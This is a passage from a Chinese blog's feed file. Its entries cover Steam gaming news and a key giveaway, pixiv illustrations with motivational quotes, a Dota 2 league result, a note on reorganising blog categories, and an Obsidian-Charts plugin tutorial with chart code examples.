        <content type="html"><![CDATA[<p><strong>01</strong></p><p>Steam喜加一</p><p>为了庆祝新游戏《桌面地下城：回溯》上线，原版游戏<strong>《桌面地下城》</strong>现已在Steam开放免费领取！</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-e31e1118b346a84300d6b16eab1ee01e.png"></p><p>商店页：s.team&#x2F;a&#x2F;226620&#x2F;</p><p>这是一款奇幻背景的快节奏Roguelike解密游戏。游戏中，你将扮演一位王国的管理者，派遣不同种族、职业的英雄前往各种各样的地下城冒险，挑战种类繁多，特性不一的敌人，同时利用所获取的资源逐步将王国发展壮大。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-f957c25c94f27e4b2f5d0352f44a309b.png"></p><p>游戏原价48元，当前累计好评率89%，支持简体中文，免费领取时间截至4月26日12:00，各位同学不要错过！</p><p><strong>02</strong></p><p>索尼涨价</p><p>4月14日，索尼在Steam发售的第一方丧尸生存游戏《往日不再》突然涨价，游戏由279元上涨至345元，这对一款已发售两年的游戏来说相当反常，毕竟游戏哪有越卖越贵的道理。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-e5c952d5068f6f755866e19c32144572.png"></p><p>然而《往日不再》涨价仅仅是一个开始，现在，除了刚刚发售的《最后的生还者1：重制版》外，几乎所有索尼的第一方游戏在Steam上都进行了价格上调。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-1d0301c5b156f937316975ac4cc98374.png"></p><p>《战神4》、《地平线：零之曙光》从原价279元涨至345元。《神秘海域：盗贼遗产合集》、《漫威蜘蛛侠：迈尔斯》从319元涨至345元。《漫威蜘蛛侠：重制版》、《死亡回归》和《麻布仔大冒险》从379元涨至414元。</p><p>反向打折了属于是…</p><p><strong>03</strong></p><p>《使命召唤：现代战争2》</p><p>动视宣布为期一周的<strong>《使命召唤：现代战争2》</strong>免费多人模式试玩活动将于北京时间4月20日01:00开始。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-eeccdb572aed2c02b2ab7b710e57936c.jpeg"></p><p>本次玩家可以体验六张核心多人游戏地图、四张枪战地图、一张地面战争地图。可以体验的多人模式为：团队死斗、热点、占领、击杀确认、枪战、感染、致命一发、地面战争、入侵等。</p><p><strong>04</strong></p><p>《魔戒：咕噜》</p><p>魔幻RPG游戏《魔戒：咕噜》配置要求更新，主要是显卡需求提高。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-e224d09d6276881a63a119aacbc6d42f.png"></p><p>商店页：s.team&#x2F;a&#x2F;1265780&#x2F;</p><p>原先最低配置显卡需求GTX 1080&#x2F;RTX 2060，推荐配置显卡需求RTX 3080，现已变更为最低配置显卡需求RTX 3060&#x2F;RX 5700 XT(8 GB)，推荐配置显卡需求RTX 4070 &#x2F; AMD Radeon RX 6800 XT (16GB)。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-6e5f1ba582000f7419744f1aaf035436.png"></p><p>不知道游戏是画面资源太强大，还是开发商优化水平太拉跨，总之这个RTX 3080起步的要求已经可以将一大波用户拒之门外了。</p><p><strong>05</strong></p><p>《我的世界：传奇》</p><p>由Mojang开发，微软Xbox发行的<strong>《我的世界：传奇》</strong>现已在Steam发售。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-0b303bf1c71e307698590e059b78a698.png"></p><p>商店页：s.team&#x2F;a&#x2F;1928870&#x2F;</p><p>这是一款动作战略游戏。玩家将在游戏中探索一片柔和的土地，这里有丰富的资源和郁郁葱葱的生物群系。但肆虐的猪灵已经到来，你将带领你的伙伴们进行战斗，拯救世界！</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-cd4c19966d53e88a902d09dc83558e37.jpeg"></p><p>游戏标准版售价119元，豪华版售价139元，支持简体中文，当前累计好评率65%。</p><p><strong>06</strong></p><p>每日福利</p><p>每天送15个喜加一KEY，“点赞”+“在看”的百位数之和，决定第二天中有几个好游戏！</p><p>▲向上滑动</p><p>K8A5W-WJ6YE-D5XJL</p><p>X?XIN-VQZDP-CPI7Q</p><p>ANCLZ-0XJC4-CH2H9</p><p>7GATZ-?Z5XB-ZWXBB</p><p>TH9W9-49AZP-MDW3W</p><p>TFL?J-XBCAQ-D5DFC</p><p>6TQPV-II6BV-MBI6E</p><p>GDK3C-3A9?K-05I3G</p><p>034JJ-22PCP-IH95N</p><p>9LKG3-AM8A?-Q5AZT</p><p><strong>激活方式：</strong></p><p>登录Steam，点击左下角“添加游戏”</p><p>点击“在Steam上激活产品”</p><p>（本期包含10个《罪恶装备2》</p><p>CDKEY中问号为0~6随机数字）</p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> steam </tag>
            
            <tag> 游戏 </tag>
            
            <tag> 喜加一 </tag>
            
            <tag> 索尼 </tag>
            
            <tag> 资讯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.18pixiv插画分享</title>
      <link href="/1468.html"/>
      <url>/1468.html</url>
      
        <content type="html"><![CDATA[<p>全世界只有不到0.1%的人关注了我</p><p>你可真是个很特别的人~</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-0b907632b6a2bdef6f9c2fd72597d389.png"></p><p>1.你永远不知道未来的你 会有什么样的人生 会和什么样的人在一起恋爱 吃的是几块钱的早餐 生活的是几线城市 会给父母怎样的回报 越努力越幸运 你的余生还很长 要坚强地走下去 要做一个优秀的女孩儿 对自己狠一点 逼自己努力 再过五年 你将会感谢今天发狠的自己 恨透今天懒情自卑的自己 既然认准一条路 那就坚持走下去 命运不会辜负每一个对自己认真而努力的人</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-8cfef9de2aa82d98d1976f415cb91e7d.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-a76e6f6d2c15aecae66ae7701b225811.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-9929897ef33a309b3a4481eb3dcd333d.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-a37f5274585d00fb12ae88bf1ad92619.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-73b25ebc30c4785571c8af00c2b52973.png"></p><p>2.我们总觉得自己还小 还能贪婪的享受所有美好 后来惊讶地发现自己不知从何开始 看得清糖衣里的炮弹 读得出微笑后的杀机 也懂得应付敷衍 逢场作戏 去面对好多自己 不曾想过要面对的事 表面上人畜无害 防身的刀却一直x在身后从未离手那一刻 我终于承认了成长这回事只是不知是好是坏.</p><p>3.不是所有女孩都梦想赚大钱 也不是所有女孩都想做女强人 但当体会过一次次被人肯定认可以后 当你知道自己除了等待还可以争取 当你经济独立自我创造安全感 当你学会了潇洒地笑 潇洒的活着 你会发现 自己爱自己比别人来爱你更有意</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-33ab2874c5111a5a6c4ab15889656914.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-ce0cf36d0ca93572dd5b6d2b3624ea0e.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-8bfb8bcbb0851673607a0d969489753b.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-ae85a83a8ebecddc4eb2d10c3f8c030b.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-bf14c4965862d64d7ff6196a9e7812c4.png"></p><p>4.不管什么年纪 别辜负最好的自己！把每一句我不会“都改为我可以学” 把每一句我不敢“都改为我一定行” 尝试总比永远不敢开始要强.</p><p>5.心有所期 全力以赴 定有所成，不要假装努力因为结局不会陪你演戏，跨过星河 迈过月亮 去努力迎接更好的自己 ， 人生那么长，总要用力拼搏一次</p><p>6.生如蝼蚁当立鸿鹄之志，命薄似纸应有不屈之心。乾坤未定，你我皆是黑马。祝你飞黄腾达前程似锦。</p><p>7.总有一天你会明白 你的委屈要自己消化 你的秘密不能逢人就提起 真正能解脱自己的只能靠努力.</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-5111a5ca9ccfccf79fcc91785e5f713a.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-0e43dedaa2930bbc4ea31a757415c281.png"><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-562b66a72c65117547871f83d8c5d7e4.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-9847057cfbf48e39fcf4f22c0ac8610d.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-119d6eff3f8915f6fd95a2c3293578f0.png"></p><p>8.对自己狠一点 逼自己努力 再过五年 你将会感谢今天发狠的自己 恨透今天懒憤自卑的自己 我始终相信一句话：只有自己足够强大 才不会被别人践踏.</p><p>9.有压力 但不要被压垮 迷茫但不要绝望 在冷言嘲笑中翻盘 成为别人的可望不可及 你真的努力过了才有资格说你拼过 你可以打败我 但永远也别想让我求饶 生命本该有意义 我们绝不是白来一场 不要指望谁会陪你一辈子 没光的时候连影子都会离开你.</p><p>10.你可以在夜晚里崩溃痛哭 但我希望天一亮你又能顶住来自四面八方的压力 继续生活.</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-8fb93b0a3d413dac1b8c7210435c117b.png"></p><p>这期还满意吗❤</p>]]></content>
      
      
      <categories>
          
          <category> 山海图册 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> p站 </tag>
            
            <tag> 分享 </tag>
            
            <tag> 插画 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>梦幻联赛S19小组赛二阶段Day5：西欧双雄持续领跑</title>
      <link href="/de4a7b38.html"/>
      <url>/de4a7b38.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-6c603ced99c8af94aa4c01e9ff365a32-scaled.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-84ae875dc6d49961ad08f4c5454ac078.gif"></p><p><strong>DPC中国联赛</strong></p><p>A级联赛昨日赛果</p><p>iG.V 1-2 cactusBright 1-2 孤独摇滚4月20日赛程预告12:00 Nova vs 孤独摇滚15:00 Poke vs iG.V前往斗鱼和B站可以观看直播，微博为本次赛事独家媒体平台</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-dece326ad68a81f0b6b6c425be89fb52.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-80b7e9a7037c66163f8bf66d774f3492.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-7c799dbc3bf34a323cedf6ac0c7f5ed6.png"></p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dota2 </tag>
            
            <tag> 比赛 </tag>
            
            <tag> 资讯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>抽空合并、修改博客分类</title>
      <link href="/1441.html"/>
      <url>/1441.html</url>
      
        <content type="html"><![CDATA[<p>今天抽空理了下分类，不数不知道，一数吓一跳，居然开了 22 个分类栏目。</p><p>乱七八糟的一大堆，越看越别扭，遂决定合并分类，并作相应修改。</p><p>合并完还剩 9 个。</p><p>因为合并了分类，又改了分类名，估计收录都要丢了，不过也无所谓。</p><p>强迫症发作，顺便又把几个分类 ID 比较大的留着的分类，往分类 ID 比较小的没用的转移了一下。</p><p>好像丢了几篇文章，也不知道是啥，不管了。</p><h2 id="Bulk-Move"><a href="#Bulk-Move" class="headerlink" title="Bulk Move"></a>Bulk Move</h2><p>合并文章分类插件用的是 Bulk Move。</p><p>这个插件名字很奇怪，界面也丑，不过很好用。</p><p>可以批量转移合并分类、标签、标签合并到分类、自定义文章类型的分类和标签合并转移、文章格式转移。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> 分类 </tag>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 Obsidian-Charts 插件进行绘制图表</title>
      <link href="/1341.html"/>
      <url>/1341.html</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>观察数据最好的方式就是将数据可视化，即用折线图、柱状图、饼图等形式将数据呈现出来。</p><p>Obsidian-Charts 插件就是做这个事情的，不仅如此，Obsidian-Charts 插件创建的图形是交互式图形，用户可以通过鼠标与图形交互，比如隐藏部分数据、观察数据点的具体数值。Obsidian-Charts 插件能够快速创建折线图 、柱状图、饼图、环状图、雷达图、极地图等类型的交互式图形。它还可以把 Obsidian 中的表格一键转化为交互式图形。同时该插件还能将生成的交互式图形转化为静态图片。Obsidian-Charts 插件为您建立了一条从<strong>数据</strong>到<strong>交互式图形</strong>，再到<strong>静态图片</strong>的阳光大道，增强了 Obsidian 的应用场景。</p><p>该插件是开源的，代码托管在 Github 上，地址: <a href="https://github.com/phibr0/obsidian-charts/" title="https://github.com/phibr0/obsidian-charts/">https://github.com/phibr0/obsidian-charts/</a></p><p>下面我们介绍这个插件的安装和使用。</p><p>gif图请点击查看哦，不会自动加载展示</p><h2 id="Obsidian-Charts-插件安装"><a href="#Obsidian-Charts-插件安装" class="headerlink" title="Obsidian-Charts 插件安装"></a>Obsidian-Charts 插件安装</h2><p><em>对 Obsidian 插件安装比较熟悉的读者可以跳过本节。</em></p><p>在国内在线安装 Obsidian 插件有困难，很难连上 Obsidian 的插件服务器，因此在此只介绍<strong>离线安装</strong>。安装步骤如下：</p><ul><li>访问 <a href="https://github.com/phibr0/obsidian-charts/releases/" title="https://github.com/phibr0/obsidian-charts/releases/">https://github.com/phibr0/obsidian-charts/releases/</a>；</li><li>将下图红框中的三个文件下载到本地；</li><li>如果 Obsidian 是打开的先关闭它；</li><li>在你的 Obsidian 库的 <code>.obsidian/plugins</code> 目录下新建 <code>obsidian-charts</code> 文件夹 （如果 <code>plugins</code> 目录不存在就创建一个）；</li><li>将下载的3个文件拷贝到新建的<code>obsidian-charts</code> 文件夹。</li></ul><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-22-1024x395.png" alt="image"></p><p>为了方便读者，我们已经将这三个文件打包，下载链接：<a href="https://cdn.gjcloak.xyz/cloudreve/1/2023/04/17/1_20230417083819_obsidian-charts.zip">obsidian-charts</a></p><ul><li>启动 Obsidian ；</li><li>按下面的视频激活 obsidian-charts 插件。</li></ul><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/enable-oc-plugin-1024x667.gif" alt="enable-oc-plugin"></p><h2 id="六种图形类型"><a href="#六种图形类型" class="headerlink" title="六种图形类型"></a>六种图形类型</h2><p>使用 Obsidian-Charts 插件可以创建六种类型的图形：折线图 、柱状图、饼图、环状图、雷达图、极地图。</p><h3 id="折线图"><a href="#折线图" class="headerlink" title="折线图"></a>折线图</h3><p>折线图是用线条连接数据点，一般用于显示变化趋势或两个数据集的比较。</p><p>下面的代码用折线图显示3个股票周一至周五的收盘价。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">```chart</span><br><span class="line">type: line</span><br><span class="line">labels: [周一,周二,周三,周四,周五]</span><br><span class="line">series:</span><br><span class="line">  - title: 股票A</span><br><span class="line">    data: [1,2,3,4,5]</span><br><span class="line">  - title: 股票B</span><br><span class="line">    data: [5,4,3,2,1]</span><br><span class="line">  - title: 股票C</span><br><span class="line">    data: [8,2,5,1,4]</span><br><span class="line">```</span><br></pre></td></tr></table></figure><p><strong>如果将上述代码粘贴到 Obsidian 中，请使用<code>Ctrl+Shift+V</code> 粘贴，以避免粘贴过程中 Obsidian 更改缩进 ！！！后面的代码同样如此！！！</strong></p><p>显示效果如下：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-23-1024x507.png"></p><p>代码很直观，看几眼就能猜出来是什么意思。有几个地方稍微介绍一下。</p><ul><li>**<code>chart</code>**，Obsidian-Charts 插件使用 Obsidian 的代码块来描述绘图信息。它使用了 <code>chart</code> 关键字告诉 Obsidian，下面的代码交给我来处理。</li><li>**<code>type</code>**，用于指明图形类型。可取值包括：<code>line</code> (折线图)、<code>bar</code> (柱状图)、<code>pie</code> (饼图)、<code>doughnut</code> (环状图)、<code>radar</code> (雷达图)、<code>polarArea</code> (极地图)。</li><li>**<code>labels</code>**，用于指定 x 轴标注，如本例中的周一、周二等。</li><li>**<code>series</code>**，声明要绘制的数据集。每一个数据集由 <code>title</code> 和 <code>data</code> 两个属性构成。<code>title</code> 用于声明数据集标签， <code>data</code> 用于声明数据集中的数据，数据用<code>中括号</code>引起来，类似于 python 中的列表。</li></ul><h3 id="柱状图"><a href="#柱状图" class="headerlink" title="柱状图"></a>柱状图</h3><p>柱状图是用竖形的柱子显示数据，用于显示数据趋势，或并排比较多个数据集。</p><p>下面的代码用柱状图显示3个股票周一至周五的收盘价。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">```chart</span><br><span class="line">type: bar</span><br><span class="line">labels: [周一,周二,周三,周四,周五]</span><br><span class="line">series:</span><br><span class="line">  - title: 股票A</span><br><span class="line">    data: [1.5,2,3,4,5]</span><br><span class="line">  - title: 股票B</span><br><span class="line">    data: [5,4,3,2,1.5]</span><br><span class="line">  - title: 股票C</span><br><span class="line">    data: [8,2,5,1.5,4]</span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>显示效果如下：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-24.png"></p><h3 id="饼图"><a href="#饼图" class="headerlink" title="饼图"></a>饼图</h3><p>饼图是常用的图表之一。一个圆形的饼被分成多块，每块的圆弧表示数据的比例值。该图表可直观展示数据之间的比例关系。</p><p>下面的代码用饼图显示5个水果所占的比例。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">```chart</span><br><span class="line">type: pie</span><br><span class="line">labels: [苹果,橘子,桃,西瓜,荔枝]</span><br><span class="line">series:</span><br><span class="line">  - title: Title 1</span><br><span class="line">    data: [1,2,3,4,5]</span><br><span class="line">width: 70%</span><br><span class="line">labelColors: true</span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>显示效果如下：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-25.png"></p><p>有个参数是折线图和柱状图没有的，需要说明一下。</p><ul><li>**<code>labelColors</code>**，用于指定是否用不同颜色区分数据项，默认为 <code>false</code>。一般会把这个参数设置为<code>true</code>，否则很难区分不同的数据项。</li></ul><h3 id="环状图"><a href="#环状图" class="headerlink" title="环状图"></a>环状图</h3><p>环状图与饼图类似，不同之处在于：饼图使用扇形区域表示数据，环状图使用扇形的圆环表示数据。其实环状图是在饼图的基础上，以圆点为中心切去一块圆形形成的，一般切去的圆形的半径是外圆半径的50%。</p><p>下面的代码用环状图显示5个水果所占的比例。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">```chart</span><br><span class="line">type: doughnut</span><br><span class="line">labels: [苹果,橘子,桃,西瓜,荔枝]</span><br><span class="line">series:</span><br><span class="line">  - title: Title 1</span><br><span class="line">    data: [1,2,3,4,5]</span><br><span class="line">width: 70%</span><br><span class="line">labelColors: true</span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>显示效果如下：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-26.png"></p><h3 id="极地图"><a href="#极地图" class="headerlink" title="极地图"></a>极地图</h3><p>极地图也是用饼形来显示数据，这一点和饼图相似，不同之处在于：饼图中每块扇形的半径是一样的，但扇形的圆心角不同，圆心角的大小由数据大小决定，而极地图每块扇形的圆心角是一样的，但扇形的半径不同，半径的大小由数据大小决定。</p><p>下面的代码用极地图显示5个水果数量的对比。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">```chart</span><br><span class="line">type: polarArea</span><br><span class="line">labels: [苹果,橘子,桃,西瓜,荔枝]</span><br><span class="line">series:</span><br><span class="line">  - title: Title 1</span><br><span class="line">    data: [1,2,3,4,5]</span><br><span class="line">width: 70%</span><br><span class="line">labelColors: true</span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>显示效果如下：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-27.png"></p><h3 id="雷达图"><a href="#雷达图" class="headerlink" title="雷达图"></a>雷达图</h3><p>雷达图是显示多个数据点和它们之间差异的一种方式，通常用于比较两个或更多不同数据集的点。</p><p>下面的代码用雷达图显示小明和小芳2个小朋友七门功课的成绩分布，从图中可以直观的看出小明和小芳的强项和弱项。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">```chart</span><br><span class="line">type: radar</span><br><span class="line">labels: [数学,物理,化学,语文,英语,地理,历史]</span><br><span class="line">series:</span><br><span class="line">  - title: 小明</span><br><span class="line">    data: [90,80,92,60,77,67,82]</span><br><span class="line">  - title: 小芳</span><br><span class="line">    data: [70,72,60,90,97,100,62]</span><br><span class="line">width: 80%</span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>显示效果如下：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-28.png"></p><h2 id="属性说明"><a href="#属性说明" class="headerlink" title="属性说明"></a>属性说明</h2><p>Obsidian-Charts 插件使用属性来控制绘图行为，因此需要对这些属性有一些基本的了解。下面通过说明和示例为大家介绍这些属性。</p><h3 id="width"><a href="#width" class="headerlink" title="width"></a>width</h3><ul><li><strong>功能</strong>：控制图形显示宽度。默认宽度为100%。</li><li><strong>适用图型</strong>：所有</li><li>可以用<strong>固定值</strong>指定宽度，如 <code>width: 300px</code></li><li>也可以用<strong>百分比</strong>指定宽度，如 <code>width: 50%</code></li><li><strong>默认值</strong>： 100%</li></ul><p>演示如下：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/oc-plugin-width-1024x343.gif"></p><h3 id="fill"><a href="#fill" class="headerlink" title="fill"></a>fill</h3><ul><li><strong>功能</strong>：控制折线下方是否填充颜色。默认不填充颜色。</li><li><strong>适用图型</strong>：折线图</li><li><strong>数据类型</strong>：布尔</li><li><strong>取值</strong>：<code>true</code>, <code>false</code></li><li><strong>默认值</strong>： <code>false</code></li></ul><p>演示如下：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/oc-plugin-fill-1024x336.gif"></p><h3 id="spanGaps"><a href="#spanGaps" class="headerlink" title="spanGaps"></a>spanGaps</h3><ul><li><strong>功能</strong>：控制绘图时遇到数据点为 <code>null</code> 时的行为。有两种行为，一是绘制上一个有效点到下一个有效点的连线，二是不绘制上一个有效点到下一个有效点的连线。默认不绘制。</li><li><strong>适用图型</strong>：折线图</li><li><strong>数据类型</strong>：布尔</li><li><strong>取值</strong>：<code>true</code>, <code>false</code></li><li><strong>默认值</strong>： <code>false</code></li></ul><p>演示如下：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/oc-plugin-spangaps-1024x330.gif"></p><h3 id="tension"><a href="#tension" class="headerlink" title="tension"></a>tension</h3><ul><li><strong>功能</strong>：控制贝赛尔曲线的线张力，值为0时绘制直线。默认显示直线。</li><li><strong>适用图型</strong>：折线图</li><li><strong>数据类型</strong>：双精度浮点数</li><li><strong>取值范围</strong>：0-1</li><li><strong>默认值</strong>： 0</li></ul><p>演示如下：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/oc-plugin-tension-1024x330.gif"></p><h3 id="beginAtZero"><a href="#beginAtZero" class="headerlink" title="beginAtZero"></a>beginAtZero</h3><ul><li><strong>功能</strong>：控制折线图的Y轴是否从0开始显示。这个主要用于控制数据集里的数据全部大于0的情况下如何绘图，如果该项设为<code>true</code>，则Y轴从0开始显示，如果该项设为<code>false</code>，则Y轴从数据集里最小的数据开始显示。默认不从0开始。</li><li><strong>适用图型</strong>：折线图</li><li><strong>数据类型</strong>：布尔</li><li><strong>取值</strong>：<code>true</code>, <code>false</code></li><li><strong>默认值</strong>： <code>false</code></li></ul><p>演示如下：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/oc-plugin-beginatzero-1024x330.gif"></p><h3 id="legend"><a href="#legend" class="headerlink" title="legend"></a>legend</h3><ul><li><strong>功能</strong>：控制是否显示图例。默认显示图例。</li><li><strong>适用图型</strong>：所有</li><li><strong>数据类型</strong>：布尔</li><li><strong>取值</strong>：<code>true</code>, <code>false</code></li><li><strong>默认值</strong>： <code>true</code></li></ul><p>演示如下：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/oc-plugin-legend-1024x330.gif"></p><h3 id="legendPosition"><a href="#legendPosition" class="headerlink" title="legendPosition"></a>legendPosition</h3><ul><li><strong>功能</strong>：控制图例的显示位置。图例可以显示在图形的上、下、左、右四个位置，默认显示在上方。</li><li><strong>适用图型</strong>：所有</li><li><strong>取值</strong>：<code>top</code>, <code>left</code>, <code>bottom</code>, <code>right</code></li><li><strong>默认值</strong>： <code>top</code></li></ul><p>演示如下：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/oc-plugin-legend-position-1024x330.gif"></p><h2 id="坐标轴属性"><a href="#坐标轴属性" class="headerlink" title="坐标轴属性"></a>坐标轴属性</h2><p><strong>坐标轴属性仅适用于折线图和柱状图。</strong></p><h3 id="indexAxis"><a href="#indexAxis" class="headerlink" title="indexAxis"></a>indexAxis</h3><ul><li><strong>功能</strong>：控制数据标签显示在x轴上还是显示在y轴上。默认显示在x轴上。</li><li><strong>适用图型</strong>：折线图、柱状图</li><li><strong>取值</strong>：<code>x</code>, <code>y</code></li><li><strong>默认值</strong>： <code>x</code></li></ul><p>演示如下：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/oc-plugin-legend-index-axis-1024x330.gif"></p><h3 id="stacked"><a href="#stacked" class="headerlink" title="stacked"></a>stacked</h3><ul><li><strong>功能</strong>：控制是否以堆叠的形式显示数据集。默认为不堆叠。</li><li><strong>适用图型</strong>：折线图、柱状图</li><li><strong>数据类型</strong>：布尔</li><li><strong>取值</strong>：<code>true</code>, <code>false</code></li><li><strong>默认值</strong>： <code>false</code></li></ul><p>演示如下：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/oc-plugin-legend-stacked-1024x330.gif"></p><h3 id="Title"><a href="#Title" class="headerlink" title="Title"></a>Title</h3><ul><li><strong>功能</strong>：控制 x 轴或 y 轴的标题。坐标轴默认是没有标题的。如果要给 x 轴添加标题，则在 <code>Title</code> 前加 <code>x</code>，如：<code>xTitle: &quot;姓名&quot;</code>。如果要给 y 轴添加标题，则在 <code>Title</code> 前加 <code>y</code>，如：<code>yTitle: &quot;数量&quot;</code>。</li><li><strong>适用图型</strong>：折线图、柱状图</li><li><strong>数据类型</strong>：字符串</li></ul><p>演示如下：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/oc-plugin-title-1024x339.gif"></p><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><ul><li><strong>功能</strong>：控制 x 轴或 y 轴的显示方向。x 轴默认是从左往右显示，y 轴默认是从下往上显示。如果 x 轴要从右往左显示，则在 <code>Reverse</code> 前加 <code>x</code>，如：<code>xReverse: true</code>。如果 y 轴要从上往下显示，则在 <code>Reverse</code> 前加 <code>y</code>，如：<code>yReverse: true</code>。</li><li><strong>适用图型</strong>：折线图、柱状图</li><li><strong>数据类型</strong>：布尔</li><li><strong>取值</strong>：<code>true</code>, <code>false</code></li><li><strong>默认值</strong>： <code>false</code></li></ul><p>演示如下：</p><p><img 